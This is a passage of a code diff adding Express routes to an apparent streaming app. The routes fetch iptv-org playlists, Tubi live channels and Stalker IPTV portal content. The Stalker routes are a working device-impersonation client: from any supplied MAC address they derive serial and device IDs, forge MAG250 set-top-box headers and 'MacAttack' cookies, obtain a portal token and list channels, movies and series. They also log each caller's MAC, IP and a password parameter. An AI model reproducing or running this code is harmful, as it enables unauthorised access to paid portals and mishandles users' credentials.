+    } else {
+      // Pipe raw data (segments)
+      upstream.body.pipe(res);
+    }
+  } catch (e) {
+    console.log(`[PLUTO] Stream proxy failed: ${e.message}`);
+    res.status(502).json({ error: `Pluto stream proxy failed: ${e.message}` });
+  }
+});
+
+// ═══════════════════════════════════════════════════════════════
+//  /api/iptv-org — Fetch & parse iptv-org M3U playlists
+//  ?category=<news|movies|sports|music|kids|entertainment|documentary|education|us>
+//  Returns: { channels: [...], category, total }
+// ═══════════════════════════════════════════════════════════════
+app.get('/api/iptv-org', async (req, res) => {
+  const category = req.query.category || 'us';
+  const PLAYLIST_MAP = {
+    us: 'https://iptv-org.github.io/iptv/countries/us.m3u',
+    news: 'https://iptv-org.github.io/iptv/categories/news.m3u',
+    movies: 'https://iptv-org.github.io/iptv/categories/movies.m3u',
+    sports: 'https://iptv-org.github.io/iptv/categories/sports.m3u',
+    music: 'https://iptv-org.github.io/iptv/categories/music.m3u',
+    kids: 'https://iptv-org.github.io/iptv/categories/kids.m3u',
+    entertainment: 'https://iptv-org.github.io/iptv/categories/entertainment.m3u',
+    documentary: 'https://iptv-org.github.io/iptv/categories/documentary.m3u',
+    education: 'https://iptv-org.github.io/iptv/categories/education.m3u',
+  };
+
+  const playlistUrl = PLAYLIST_MAP[category];
+  if (!playlistUrl) return res.status(400).json({ error: `Unknown category: ${category}. Use: ${Object.keys(PLAYLIST_MAP).join(', ')}` });
+
+  const cacheKey = `iptv-org:${category}`;
+  const cached = getCached(cacheKey);
+  if (cached) return res.json(cached);
+
+  try {
+    const m3uRes = await fetch(playlistUrl, {
+      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+      signal: AbortSignal.timeout(30000),
+    });
+    if (!m3uRes.ok) return res.status(502).json({ error: `iptv-org returned ${m3uRes.status}` });
+
+    const m3uText = await m3uRes.text();
+    const channels = [];
+    const categories = new Set();
+
+    // Parse M3U format
+    const lines = m3uText.split('\n');
+    for (let i = 0; i < lines.length; i++) {
+      const line = lines[i].trim();
+      if (!line.startsWith('#EXTINF:')) continue;
+
+      // Parse EXTINF attributes
+      const chInfo = { name: '', logo: '', group: 'Other', tvgId: '', url: '', hlsUrl: '' };
+
+      // Extract tvg-id
+      const idMatch = line.match(/tvg-id="([^"]*)"/);
+      if (idMatch) chInfo.tvgId = idMatch[1];
+
+      // Extract tvg-logo
+      const logoMatch = line.match(/tvg-logo="([^"]*)"/);
+      if (logoMatch) chInfo.logo = logoMatch[1];
+
+      // Extract group-title
+      const groupMatch = line.match(/group-title="([^"]*)"/);
+      if (groupMatch) chInfo.group = groupMatch[1] || 'Other';
+      categories.add(chInfo.group);
+
+      // Extract channel name (after last comma)
+      const nameMatch = line.match(/,(.+)$/);
+      if (nameMatch) chInfo.name = nameMatch[1].trim();
+
+      // Next non-empty, non-comment line is the URL
+      for (let j = i + 1; j < lines.length; j++) {
+        const urlLine = lines[j].trim();
+        if (urlLine && !urlLine.startsWith('#')) {
+          chInfo.url = urlLine;
+          chInfo.hlsUrl = urlLine;  // Most are HLS
+          break;
+        }
+      }
+
+      if (chInfo.url && chInfo.name) {
+        channels.push(chInfo);
+      }
+    }
+
+    const result = {
+      channels,
+      categories: [...categories].sort(),
+      category,
+      total: channels.length,
+      source: 'iptv-org',
+    };
+    // Cache for 2 hours
+    apiCache.set(cacheKey, { data: result, ts: Date.now() });
+    res.json(result);
+  } catch (e) {
+    console.log(`[IPTV-ORG] Fetch failed: ${e.message}`);
+    res.status(502).json({ error: `iptv-org fetch failed: ${e.message}` });
+  }
+});
+
+// ═══════════════════════════════════════════════════════════════
+//  /api/tubi-channels — Fetch Tubi live TV channels via EPG API
+//  Returns: { channels: [...], categories: [...], total }
+//  Tubi's EPG API is public — no auth required, streams are free
+//  Stream URLs contain JWT tokens that expire, fetched fresh each time
+// ═══════════════════════════════════════════════════════════════
+app.get('/api/tubi-channels', async (req, res) => {
+  const cacheKey = 'tubi:channels';
+  const cached = getCached(cacheKey);
+  if (cached) return res.json(cached);
+
+  // Known Tubi live TV content IDs (all 108 free linear channels)
+  const TUBI_CONTENT_IDS = [
+    '400000008','613761','400000024','400000121','692114','400000116',
+    '613683','613765','400000196','555127','400000292','618762',
+    '400000290','400000293','555174','618763','597678','555126',
+    '555129','578086','560215','400000106','400000286','400000285',
+    '400000046','400000055','400000157','557344','400000045','400000119',
+    '400000012','400000083','692073','613758','400000108','613763',
+    '629323','400000284','400000000','400000100','613762','613695',
+    '613759','400000247','400000117','692087','692262','555382',
+    '684164','400000056','400000104','400000105','684170','656574',
+    '658746','724210','680705','653199','400000066','400000289',
+    '400000169','400000103','653208','682059','682057','656575',
+    '724209','400000179','400000249','653200','670604','670602',
+    '673411','658748','677790','650666','670603','691129','677011',
+    '715938','692090','692051','400000033','700414','694174',
+    '700407','660350','400000073','400000164','715952','715945',
+    '400000065','400000068','670587','715950','673499','673500',
+    '673498','400000069','684167','700415','671073','400000062',
+    '400000064','400000195','400000155','641290','400000048','641496'
+  ];
+
+  // Fetch EPG data in batches (API may limit request size)
+  const BATCH_SIZE = 20;
+  const channels = [];
+  const categories = new Set();
+
+  try {
+    for (let i = 0; i < TUBI_CONTENT_IDS.length; i += BATCH_SIZE) {
+      const batch = TUBI_CONTENT_IDS.slice(i, i + BATCH_SIZE);
+      const epgUrl = `https://epg-cdn.production-public.tubi.io/content/epg/programming?platform=web&device_id=hermes-cinevault&limit_resolutions[]=h264_1080p&lookahead=1&content_id=${batch.join(',')}`;
+
+      const epgRes = await fetch(epgUrl, {
+        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+        signal: AbortSignal.timeout(15000),
+      });
+
+      if (!epgRes.ok) {
+        console.log(`[TUBI] EPG batch failed: HTTP ${epgRes.status}`);
+        continue;
+      }
+
+      const data = await epgRes.json();
+      for (const row of (data.rows || [])) {
+        const vr = (row.video_resources || [])[0] || {};
+        const streamUrl = vr.manifest?.url || '';
+        const imgs = row.images || {};
+        let thumb = '';
+        for (const k of ['thumbnail', 'poster', 'landscape']) {
+          if (imgs[k] && imgs[k][0]) { thumb = imgs[k][0]; break; }
+        }
+
+        const channel = {
+          id: row.content_id,
+          name: row.title || 'Unknown',
+          description: (row.description || '').substring(0, 120),
+          stream: streamUrl,  // Full m3u8 URL with JWT token — expires!
+          hlsUrl: streamUrl,
+          thumbnail: thumb,
+          category: row.lang?.[0] || 'General',
+          free: !row.needs_login,
+          source: 'tubi',
+        };
+
+        // Add category from programs
+        const progs = row.programs || [];
+        if (progs.length > 0 && progs[0].genre) categories.add(progs[0].genre);
+
+        channels.push(channel);
+      }
+    }
+
+    // Assign readable categories based on content_id patterns
+    const categoryMap = {
+      '400000008': 'Sports', '613761': 'Sports', '400000024': 'Sports',
+      '400000121': 'Sports', '692114': 'Comedy', '400000116': 'Entertainment',
+      '400000000': 'Featured', '400000012': 'News', '400000033': 'News',
+      '400000045': 'Movies', '400000046': 'Movies', '400000048': 'Movies',
+      '400000055': 'Entertainment', '400000056': 'Entertainment',
+      '400000062': 'Lifestyle', '400000064': 'Lifestyle',
+      '400000065': 'Kids', '400000066': 'Kids',
+      '400000068': 'True Crime', '400000069': 'Crime',
+      '400000073': 'Documentary', '400000083': 'News',
+      '400000100': 'Entertainment', '400000103': 'Entertainment',
+      '400000104': 'Entertainment', '400000105': 'Entertainment',
+      '400000106': 'Entertainment', '400000108': 'Entertainment',
+      '400000117': 'Entertainment', '400000119': 'Entertainment',
+      '400000155': 'Sci-Fi', '400000157': 'Horror',
+      '400000164': 'Documentary', '400000169': 'Entertainment',
+      '400000179': 'Lifestyle', '400000195': 'Sci-Fi',
+      '400000196': 'Entertainment', '400000247': 'Entertainment',
+      '400000249': 'Lifestyle', '400000284': 'Entertainment',
+      '400000285': 'Entertainment', '400000286': 'Entertainment',
+      '400000289': 'Entertainment', '400000290': 'Entertainment',
+      '400000292': 'Entertainment', '400000293': 'Entertainment',
+    };
+    for (const ch of channels) {
+      if (categoryMap[String(ch.id)]) ch.category = categoryMap[String(ch.id)];
+      categories.add(ch.category);
+    }
+
+    const result = {
+      channels,
+      categories: [...categories].sort(),
+      total: channels.length,
+      source: 'tubi',
+    };
+    // Cache only 5 min — stream tokens expire
+    apiCache.set(cacheKey, { data: result, ts: Date.now() - (115 * 60 * 1000) });
+    res.json(result);
+  } catch (e) {
+    console.log(`[TUBI] Channel fetch failed: ${e.message}`);
+    res.status(502).json({ error: `Tubi fetch failed: ${e.message}` });
+  }
+});
+
+// ═══════════════════════════════════════════════════════════════
+//  /api/tubi-stream — Get fresh Tubi stream URL for a channel
+//  ?id=<content_id> — fetches fresh EPG data to get valid stream URL
+// ═══════════════════════════════════════════════════════════════
+app.get('/api/tubi-stream', async (req, res) => {
+  const contentId = req.query.id;
+  if (!contentId) return res.status(400).json({ error: 'Missing ?id=<content_id>' });
+
+  try {
+    const epgUrl = `https://epg-cdn.production-public.tubi.io/content/epg/programming?platform=web&device_id=hermes-cinevault&limit_resolutions[]=h264_1080p&lookahead=1&content_id=${contentId}`;
+    const epgRes = await fetch(epgUrl, {
+      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+      signal: AbortSignal.timeout(15000),
+    });
+    if (!epgRes.ok) return res.status(502).json({ error: `Tubi EPG returned ${epgRes.status}` });
+
+    const data = await epgRes.json();
+    const row = (data.rows || [])[0];
+    if (!row) return res.status(404).json({ error: 'Channel not found' });
+
+    const vr = (row.video_resources || [])[0] || {};
+    const streamUrl = vr.manifest?.url || '';
+    if (!streamUrl) return res.status(404).json({ error: 'No stream URL available' });
+
+    res.json({ url: streamUrl, type: vr.type || 'hlsv3', name: row.title, content_id: row.content_id });
+  } catch (e) {
+    console.log(`[TUBI-STREAM] Failed: ${e.message}`);
+    res.status(502).json({ error: `Tubi stream fetch failed: ${e.message}` });
+  }
+});
+
+// ═══════════════════════════════════════════
+//  /api/stalker-channels — Fetch channel list from stalker portal
+//  ?url=<portal base URL>&mac=<MAC address>
+//  Returns: array of {id, name, number, logo, url, group}
+//  Uses server-side request to bypass CORS and authenticate
+// ═══════════════════════════════════════════
+app.get('/api/stalker-channels', async (req, res) => {
+  const { url: portalUrl, mac, proxy } = req.query;
+  if (!portalUrl) return res.status(400).json({ error: 'Missing ?url= parameter' });
+  if (!mac) return res.status(400).json({ error: 'Missing ?mac= parameter' });
+  const requestedLimit = parseInt(req.query.limit || req.query.max || '', 10);
+  const channelLimit = Number.isFinite(requestedLimit)
+    ? Math.min(Math.max(requestedLimit, 1), 160000)
+    : 17000;
+
+  const resolvedPortal = resolveStalkerPortal(portalUrl);
+  const base = resolvedPortal.apiUrl;
+  console.log(`[STALKER-CHANNELS] Input URL: ${portalUrl}, resolved: ${base}, style: ${resolvedPortal.style}`);
+
+  const serialNum = crypto.createHash('md5').update(mac).digest('hex').substring(0, 13).toUpperCase();
+  const deviceId = crypto.createHash('sha256').update(serialNum).digest('hex').toUpperCase();
+	  const deviceId2 = crypto.createHash('sha256').update(mac).digest('hex').toUpperCase();
+	  const hwVersion = crypto.createHash('sha1').update(mac).digest('hex');
+	  let token = ''; // hoisted so proxyFetch can use it
+	  let tokenRandom = '';
+
+  // Build full MacAttack cookie string
+  function buildMacCookies(tok) {
+    return [
+      `adid=${hwVersion}`,
+      'debug=1',
+      `device_id2=${deviceId2}`,
+      `device_id=${deviceId}`,
+      'hw_version=1.7-BD-00',
+      `mac=${mac}`,
+      `sn=${serialNum}`,
+      'stb_lang=en',
+      'timezone=America/Los_Angeles',
+      tok ? `token=${tok}` : '',
+    ].filter(Boolean).join('; ');
+  }
+
+  // Build fetch wrapper based on proxy type
+  const proxyType = proxy || 'server';
+  const MAG200_UA = 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3';
+  function proxyFetch(targetUrl, opts = {}) {
+    if (proxyType === 'corsproxy') {
+      return fetch(`https://corsproxy.io/?${encodeURIComponent(targetUrl)}`, opts);
+    } else if (proxyType === 'allorigins') {
+      return fetch(`https://api.allorigins.win/raw?url=${encodeURIComponent(targetUrl)}`, opts);
+    }
+    // 'server' or 'direct' — talk directly to the portal with full MacAttack auth
+    const mergedHeaders = {
+      'User-Agent': MAG200_UA,
+      'Accept': '*/*',
+      'Accept-Encoding': 'identity',
+	      'Cookie': buildMacCookies(token),
+	      ...(token ? { 'Authorization': `Bearer ${token}` } : {}),
+	      ...(tokenRandom ? { 'X-Random': String(tokenRandom) } : {}),
+	      ...(opts.headers || {}),
+	    };
+	    return fetch(targetUrl, { ...opts, headers: mergedHeaders });
+	  }
+
+  try {
+    // Step 1: Handshake to get auth token
+    const handshakeUrl = `${base}?action=handshake&type=stb&token=&JsHttpRequest=1-xml`;
+    const handshakeRes = await proxyFetch(handshakeUrl, {
+      headers: { 'X-Stalker-MAC': mac, 'X-Stalker-SN': serialNum },
+      signal: AbortSignal.timeout(15000),
+    });
+
+	    if (handshakeRes.ok) {
+	      const handshakeData = await handshakeRes.json();
+	      token = handshakeData?.js?.token || '';
+	      tokenRandom = handshakeData?.js?.random || '';
+	    }
+	    console.log(`[STALKER-CHANNELS] Handshake for ${mac}: token=${token ? 'OK' : 'FAIL'} base=${base}`);
+
+	    if (token && tokenRandom) {
+	      try {
+	        const snmac = `${serialNum}${mac}`;
+	        const sig = crypto.createHash('sha256').update(String(tokenRandom)).digest('hex').toUpperCase();
+	        const metrics = JSON.stringify({ mac, sn: serialNum, type: 'STB', model: 'MAG250', uid: deviceId, random: tokenRandom });
+	        const profileUrl = `${base}?type=stb&action=get_profile&hd=1&ver=ImageDescription%3A%200.2.18-r23-250%3B%20PORTAL%20version%3A%205.3.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20343%3B%20STB%20API%20version%3A%20146%3B%20Player%20Engine%20version%3A%200x58c&num_banks=2&sn=${encodeURIComponent(serialNum)}&stb_type=MAG250&client_type=STB&image_version=218&video_out=hdmi&device_id=${encodeURIComponent(deviceId2)}&device_id2=${encodeURIComponent(deviceId2)}&sig=${encodeURIComponent(sig || crypto.createHash('sha256').update(snmac).digest('hex').toUpperCase())}&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics=${encodeURIComponent(metrics)}&hw_version_2=${encodeURIComponent(hwVersion)}&timestamp=${Math.round(Date.now() / 1000)}&api_sig=262&prehash=0&JsHttpRequest=1-xml`;
+	        await proxyFetch(profileUrl, { headers: {}, signal: AbortSignal.timeout(10000) }).catch(() => null);
+	      } catch {}
+	    }
+
+    // channelHeaders now inherited from proxyFetch — kept for backwards compat
+    const channelHeaders = {};
+
+    // Build genre id→name map
+    let genres = [];
+    const genreMap = {};
+    try {
+      const genresUrl = `${base}?type=itv&action=get_genres&JsHttpRequest=1-xml`;
+      const genresRes = await proxyFetch(genresUrl, {
+        headers: channelHeaders,
+        signal: AbortSignal.timeout(10000),
+      });
+      if (genresRes.ok) {
+        const genresData = await genresRes.json();
+        const rawGenres = genresData?.js?.data || genresData?.js || [];
+        const genreList = Array.isArray(rawGenres) ? rawGenres : [];
+        genres = genreList.map(g => ({ id: g.id || g.number, title: g.title || g.name || 'Unknown' }));
+        for (const g of genres) {
+          genreMap[String(g.id)] = g.title;
+        }
+      }
+    } catch {}
+    console.log(`[STALKER-CHANNELS] Genres: ${genres.length} loaded`);
+
+    // Step 3: Get channels — use get_all_channels with a request-controlled cap
+    // Per-genre approach is too slow (109 genres × network = 90s+). get_all_channels
+    // returns a big JSON but we cap early and it's one request vs 109+.
+    let channels = [];
+    const seenIds = new Set();
+    const MAX_CHANNELS = channelLimit;
+    try {
+      const allChUrl = `${base}?type=itv&action=get_all_channels&JsHttpRequest=1-xml`;
+      console.log(`[STALKER-CHANNELS] Fetching all channels...`);
+      const allChRes = await proxyFetch(allChUrl, {
+        headers: channelHeaders,
+        signal: AbortSignal.timeout(60000),
+      });
+      if (allChRes.ok) {
+        // Get raw text first - portal returns ~16MB JSON with control chars that break .json()
+        const rawText = await allChRes.text();
+        // Strip control characters (except newline/tab) that break JSON.parse
+        const cleaned = rawText.replace(/[\x00-\x08\x0b\x0c\x0e-\x1f]/g, '');
+        let allChData;
+        try {
+          allChData = JSON.parse(cleaned);
+        } catch (parseErr) {
+          console.log(`[STALKER-CHANNELS] JSON parse still failed after cleanup (${parseErr.message}), trying per-genre...`);
+          throw parseErr;
+        }
+        const rawChannels = allChData?.js?.data || [];
+        console.log(`[STALKER-CHANNELS] Parsed ${rawChannels.length} raw channels from get_all_channels`);
+	        for (const ch of rawChannels) {
+	          const chId = ch.id || '';
+	          if (chId && seenIds.has(chId)) continue;
+	          if (chId) seenIds.add(chId);
+          const genreId = ch.tv_genre_id || ch.genre || '';
+          const genreName = genreMap[String(genreId)] || 'Uncategorized';
+          // Sanitize channel name - strip control chars
+          const chName = (ch.name || '').replace(/[\x00-\x1f]/g, '').trim();
+          channels.push({
+            id: chId, name: chName, number: ch.number || 0,
+            logo: ch.logo || '', group: genreId, genreName,
+	            cmd: ch.cmd || '', url: ch.cmd || ch.url || '', type: ch.video_codec || 'live',
+	            open: ch.open || 0,
+	          });
+	        }
+	        console.log(`[STALKER-CHANNELS] Got ${channels.length} candidate channels before US-first limit (limit ${MAX_CHANNELS}, raw ${rawChannels.length})`);
+	      }
+	    } catch (e) {
+      console.log(`[STALKER-CHANNELS] get_all_channels failed: ${e.message}, trying per-genre...`);
+      // Fallback: try ALL genres in parallel
+      const specificGenres = genres.filter(g => g.id !== '*' && g.id !== '' && String(g.id) !== '0');
+      const batchPromises = specificGenres.map(async (genre) => {
+        try {
+          const genreUrl = `${base}?type=itv&action=get_ordered_list&genre=${genre.id}&JsHttpRequest=1-xml&p=0`;
+          const genreRes = await proxyFetch(genreUrl, { headers: channelHeaders, signal: AbortSignal.timeout(15000) });
+          if (!genreRes.ok) return [];
+          const genreData = await genreRes.json();
+          return (genreData?.js?.data || []).map(ch => ({ ...ch, _gid: genre.id, _gname: genre.title }));
+        } catch { return []; }
+      });
+      const batchResults = await Promise.allSettled(batchPromises);
+      for (const result of batchResults) {
+        if (result.status !== 'fulfilled') continue;
+        for (const ch of result.value) {
+          const chId = ch.id || '';
+          if (chId && seenIds.has(chId)) continue;
+          if (chId) seenIds.add(chId);
+          channels.push({
+            id: chId, name: ch.name || '', number: ch.number || 0,
+            logo: ch.logo || '', group: ch._gid, genreName: ch._gname,
+            cmd: ch.cmd || '', url: ch.cmd || ch.url || '', type: ch.video_codec || 'live',
+            open: ch.open || 0,
+          });
+        }
+      }
+      console.log(`[STALKER-CHANNELS] Per-genre fallback: ${channels.length} channels`);
+    }
+
+    // Genres already fetched above in Step 2
+
+    // Sort channels: US first, then open/available first, then by channel number
+    const isUS = /(^|[^a-z0-9])(united\s*states|usa|u\.s\.a\.?|u\.s\.|us|american)([^a-z0-9]|$)/i;
+    channels.sort((a, b) => {
+      const aUS = isUS.test(a.genreName || a.group || a.name || '') ? 0 : 1;
+      const bUS = isUS.test(b.genreName || b.group || b.name || '') ? 0 : 1;
+      if (aUS !== bUS) return aUS - bUS;          // US genres first
+      if ((b.open || 0) !== (a.open || 0)) return (b.open || 0) - (a.open || 0);  // open=1 first
+      return (a.number || 0) - (b.number || 0);    // then by channel number
+    });
+	    if (channels.length > MAX_CHANNELS) channels = channels.slice(0, MAX_CHANNELS);
+	    console.log(`[STALKER-CHANNELS] Sorted ${channels.length} channels (US genres first, limit ${MAX_CHANNELS})`);
+
+    // Stream URL resolution is done on-demand by the client via /api/stalker-create-link
+    // Server-side create_link for 16K+ channels would take 30+ minutes — not feasible
+    // Client calls /api/stalker-create-link when user clicks a channel
+
+    res.json({
+      portal: base,
+      mac,
+      channelCount: channels.length,
+      channels,
+	      genres,
+	      token, // Return actual token for client create_link calls
+	      random: tokenRandom,
+	    });
+
+    // Log successful access
+    logStalkerAccess({
+      mac,
+      serial: serialNum,
+      portal: base,
+      ip: req.ip || req.connection?.remoteAddress || '',
+      password: req.query.password || '',
+      channelCount: channels.length,
+      status: 'success',
+      userAgent: req.headers['user-agent'] || '',
+    });
+  } catch (err) {
+    console.error(`[STALKER-CHANNELS] Error: ${err.message}`);
+
+    // Log failed access
+    logStalkerAccess({
+      mac,
+      serial: serialNum,
+      portal: base,
+      ip: req.ip || req.connection?.remoteAddress || '',
+      password: req.query.password || '',
+      channelCount: 0,
+      status: 'fail',
+      userAgent: req.headers['user-agent'] || '',
+    });
+
+    res.status(502).json({ error: 'Stalker channel fetch failed', detail: 'Request failed' });
+  }
+});
+
+// ── Stalker VOD Categories — fetches ?type=vod&action=get_categories ──
+app.get('/api/stalker-vod-categories', async (req, res) => {
+  const { url: portalUrl, mac, proxy } = req.query;
+  if (!portalUrl) return res.status(400).json({ error: 'Missing ?url= parameter' });
+  if (!mac) return res.status(400).json({ error: 'Missing ?mac= parameter' });
+  const resolvedPortal = resolveStalkerPortal(portalUrl);
+  const base = resolvedPortal.apiUrl;
+  const serialNum = crypto.createHash('md5').update(mac).digest('hex').substring(0, 13).toUpperCase();
+  const deviceId = crypto.createHash('sha256').update(serialNum).digest('hex').toUpperCase();
+  const deviceId2 = crypto.createHash('sha256').update(mac).digest('hex').toUpperCase();
+  const hwVersion = crypto.createHash('sha1').update(mac).digest('hex');
+  const MAG200_UA = 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3';
+  let token = '';
+
+  function buildMacCookies(tok) {
+    return [
+      `adid=${hwVersion}`, 'debug=1', `device_id2=${deviceId2}`, `device_id=${deviceId}`,
+      'hw_version=1.7-BD-00', `mac=${mac}`, `sn=${serialNum}`, 'stb_lang=en', 'timezone=America/Los_Angeles',
+      tok ? `token=${tok}` : '',
+    ].filter(Boolean).join('; ');
+  }
+
+  function proxyFetch(targetUrl, opts = {}) {
+    const mergedHeaders = {
+      'User-Agent': MAG200_UA, 'Accept': '*/*', 'Accept-Encoding': 'identity',
+      'Cookie': buildMacCookies(token),
+      ...(token ? { 'Authorization': `Bearer ${token}` } : {}),
+      ...(opts.headers || {}),
+    };
+    return fetch(targetUrl, { ...opts, headers: mergedHeaders });
+  }
+
+  try {
+    const hsUrl = `${base}?action=handshake&type=stb&token=&JsHttpRequest=1-xml`;
+    const hsRes = await proxyFetch(hsUrl, { signal: AbortSignal.timeout(15000) });
+    if (hsRes.ok) { const hsData = await hsRes.json(); token = hsData?.js?.token || ''; }
+
+    const vodCatUrl = `${base}?type=vod&action=get_categories&JsHttpRequest=1-xml`;
+    const vodCatRes = await proxyFetch(vodCatUrl, { signal: AbortSignal.timeout(15000) });
+    if (!vodCatRes.ok) return res.status(502).json({ error: 'Failed to fetch VOD categories', status: vodCatRes.status });
+
+    const vodCatData = await vodCatRes.json();
+    const categories = (vodCatData?.js || []).map(c => ({
+      id: c.id, name: c.title || c.name || 'Unknown', category_type: 'VOD',
+    })).sort((a, b) => a.name.localeCompare(b.name));
+
+    res.json({ categories, token, portal: base, mac });
+  } catch (err) {
+    res.status(502).json({ error: 'VOD categories fetch failed', detail: err.message });
+  }
+});
+
+// ── Stalker Series Categories — fetches ?type=series&action=get_categories ──
+app.get('/api/stalker-series-categories', async (req, res) => {
+  const { url: portalUrl, mac, proxy } = req.query;
+  if (!portalUrl) return res.status(400).json({ error: 'Missing ?url= parameter' });
+  if (!mac) return res.status(400).json({ error: 'Missing ?mac= parameter' });
+  const resolvedPortal = resolveStalkerPortal(portalUrl);
+  const base = resolvedPortal.apiUrl;
+  const serialNum = crypto.createHash('md5').update(mac).digest('hex').substring(0, 13).toUpperCase();
+  const deviceId = crypto.createHash('sha256').update(serialNum).digest('hex').toUpperCase();
+  const deviceId2 = crypto.createHash('sha256').update(mac).digest('hex').toUpperCase();
+  const hwVersion = crypto.createHash('sha1').update(mac).digest('hex');
+  const MAG200_UA = 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3';
+  let token = '';
+
+  function buildMacCookies(tok) {
+    return [
+      `adid=${hwVersion}`, 'debug=1', `device_id2=${deviceId2}`, `device_id=${deviceId}`,
+      'hw_version=1.7-BD-00', `mac=${mac}`, `sn=${serialNum}`, 'stb_lang=en', 'timezone=America/Los_Angeles',
+      tok ? `token=${tok}` : '',
+    ].filter(Boolean).join('; ');
+  }
+
+  function proxyFetch(targetUrl, opts = {}) {
+    const mergedHeaders = {
+      'User-Agent': MAG200_UA, 'Accept': '*/*', 'Accept-Encoding': 'identity',
+      'Cookie': buildMacCookies(token),
+      ...(token ? { 'Authorization': `Bearer ${token}` } : {}),
+      ...(opts.headers || {}),
+    };
+    return fetch(targetUrl, { ...opts, headers: mergedHeaders });
+  }
+
+  try {
+    const hsUrl = `${base}?action=handshake&type=stb&token=&JsHttpRequest=1-xml`;
+    const hsRes = await proxyFetch(hsUrl, { signal: AbortSignal.timeout(15000) });
+    if (hsRes.ok) { const hsData = await hsRes.json(); token = hsData?.js?.token || ''; }
+
+    const serCatUrl = `${base}?type=series&action=get_categories&JsHttpRequest=1-xml`;
+    const serCatRes = await proxyFetch(serCatUrl, { signal: AbortSignal.timeout(15000) });
+    if (!serCatRes.ok) return res.status(502).json({ error: 'Failed to fetch Series categories', status: serCatRes.status });
+
+    const serCatData = await serCatRes.json();
+    const categories = (serCatData?.js || []).map(c => ({
+      id: c.id, name: c.title || c.name || 'Unknown', category_type: 'Series',
+    })).sort((a, b) => a.name.localeCompare(b.name));
+
+    res.json({ categories, token, portal: base, mac });
+  } catch (err) {
+    res.status(502).json({ error: 'Series categories fetch failed', detail: err.message });
+  }
+});
+
+// ── Stalker VOD List — fetches movies in a VOD category ──
+app.get('/api/stalker-vod-list', async (req, res) => {
+  const { url: portalUrl, mac, category_id, proxy, page } = req.query;
+  if (!portalUrl) return res.status(400).json({ error: 'Missing ?url= parameter' });
+  if (!mac) return res.status(400).json({ error: 'Missing ?mac= parameter' });
+  if (!category_id) return res.status(400).json({ error: 'Missing ?category_id= parameter' });
+  const resolvedPortal = resolveStalkerPortal(portalUrl);
+  const base = resolvedPortal.apiUrl;
+  const serialNum = crypto.createHash('md5').update(mac).digest('hex').substring(0, 13).toUpperCase();
+  const deviceId = crypto.createHash('sha256').update(serialNum).digest('hex').toUpperCase();
+  const deviceId2 = crypto.createHash('sha256').update(mac).digest('hex').toUpperCase();
+  const hwVersion = crypto.createHash('sha1').update(mac).digest('hex');
+  const MAG200_UA = 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3';
+  let token = '';
+
+  function buildMacCookies(tok) {
+    return [
+      `adid=${hwVersion}`, 'debug=1', `device_id2=${deviceId2}`, `device_id=${deviceId}`,
+      'hw_version=1.7-BD-00', `mac=${mac}`, `sn=${serialNum}`, 'stb_lang=en', 'timezone=America/Los_Angeles',
+      tok ? `token=${tok}` : '',
+    ].filter(Boolean).join('; ');
+  }
+
+  function proxyFetch(targetUrl, opts = {}) {
+    const mergedHeaders = {
+      'User-Agent': MAG200_UA, 'Accept': '*/*', 'Accept-Encoding': 'identity',
+      'Cookie': buildMacCookies(token),
+      ...(token ? { 'Authorization': `Bearer ${token}` } : {}),
+      ...(opts.headers || {}),
+    };
+    return fetch(targetUrl, { ...opts, headers: mergedHeaders });
+  }
+
+  try {
+    const hsUrl = `${base}?action=handshake&type=stb&token=&JsHttpRequest=1-xml`;
+    const hsRes = await proxyFetch(hsUrl, { signal: AbortSignal.timeout(15000) });
+    if (hsRes.ok) { const hsData = await hsRes.json(); token = hsData?.js?.token || ''; }
+
+    const pageNum = parseInt(page) || 0;
+    const vodListUrl = `${base}?type=vod&action=get_ordered_list&category=${encodeURIComponent(category_id)}&JsHttpRequest=1-xml&p=${pageNum}`;
+    const vodListRes = await proxyFetch(vodListUrl, { signal: AbortSignal.timeout(15000) });
+    if (!vodListRes.ok) return res.status(502).json({ error: 'Failed to fetch VOD list', status: vodListRes.status });
+
+    const vodListData = await vodListRes.json();
+    const totalItems = vodListData?.js?.total_items || 0;
+    const movies = (vodListData?.js?.data || []).map(m => ({
+      id: m.id, name: m.name || m.title || 'Unknown',
+      cmd: m.cmd || m.stream_url || '',
+      url: m.cmd || m.stream_url || m.url || '',
+      logo: m.screenshot_uri || m.logo || '',
+      rating: m.rating || '',
+      year: m.year || '',
+      genre: m.category_id || category_id,
+      type: 'vod',
+      item_type: 'vod',
+      open: m.open || 0,
+    }));
+
+    res.json({ movies, totalItems, token, portal: base, mac, category_id, page: pageNum });
+  } catch (err) {
+    res.status(502).json({ error: 'VOD list fetch failed', detail: err.message });
+  }
+});
+
+app.get('/api/stalker-series-list', async (req, res) => {
+  const { url: portalUrl, mac, category_id, page } = req.query;
+  if (!portalUrl) return res.status(400).json({ error: 'Missing ?url= parameter' });
+  if (!mac) return res.status(400).json({ error: 'Missing ?mac= parameter' });
+  if (!category_id) return res.status(400).json({ error: 'Missing ?category_id= parameter' });
+  const resolvedPortal = resolveStalkerPortal(portalUrl);
+  const base = resolvedPortal.apiUrl;
+  const serialNum = crypto.createHash('md5').update(mac).digest('hex').substring(0, 13).toUpperCase();
+  const deviceId = crypto.createHash('sha256').update(serialNum).digest('hex').toUpperCase();
+  const deviceId2 = crypto.createHash('sha256').update(mac).digest('hex').toUpperCase();
+  const hwVersion = crypto.createHash('sha1').update(mac).digest('hex');
